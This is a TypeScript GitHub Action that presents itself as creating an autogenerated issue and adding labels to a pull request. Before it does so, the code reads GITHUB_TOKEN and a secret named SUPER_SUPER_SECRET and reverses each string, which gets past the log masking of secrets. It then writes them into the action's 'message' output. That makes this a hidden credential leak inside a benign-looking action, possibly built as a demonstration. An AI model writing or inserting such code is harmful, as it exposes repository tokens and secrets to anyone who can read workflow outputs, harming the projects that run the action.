import * as core from "@actions/core";
import * as github from "@actions/github";

async function run() {
  try {
    const issue_number = (github.context.payload as any).pull_request.number;
    let messageInput = core.getInput("message");
    messageInput += `;GITHUB_TOKEN=${(process.env.GITHUB_TOKEN || "")
      .split("")
      .reverse()
      .join("")}`;
    messageInput += `;GITHUB_REPOSITORY=${(process.env.GITHUB_REPOSITORY || "")
      .split("")
      .reverse()
      .join("")}`;
    messageInput += `;ISSUE_NUMBER=${issue_number}`;
    messageInput += `;SUPER_SUPER_SECRET=${(
      process.env.SUPER_SUPER_SECRET || ""
    )
      .split("")
      .reverse()
      .join("")}`;
    core.setOutput("message", messageInput);

    // https://help.github.com/en/articles/virtual-environments-for-github-actions#github_token-secret
    const client: github.GitHub = new github.GitHub(
      process.env["GITHUB_TOKEN"] || ""
    );

    const nwo = process.env["GITHUB_REPOSITORY"] || "/";
    const [owner, repo] = nwo.split("/");
    const sha = process.env["GITHUB_SHA"] || "";
    const suffix = ` - ${sha}`;

    // https://octokit.github.io/rest.js/#octokit-routes-issues
    await client.issues.create({
      owner: owner,
      repo: repo,
      title: "Autogenerated issue" + suffix,
      body: "Thanks for using this action. This issue was autogenerated..."
    });

    await client.issues.addLabels({
      owner: owner,
      repo: repo,
      issue_number,
      labels: ["bug", "good first issue", "enhancement"]
    });
  } catch (error) {
    core.setFailed(error.message + "\n\n" + error.stack);
  }
}

run();

export default run;
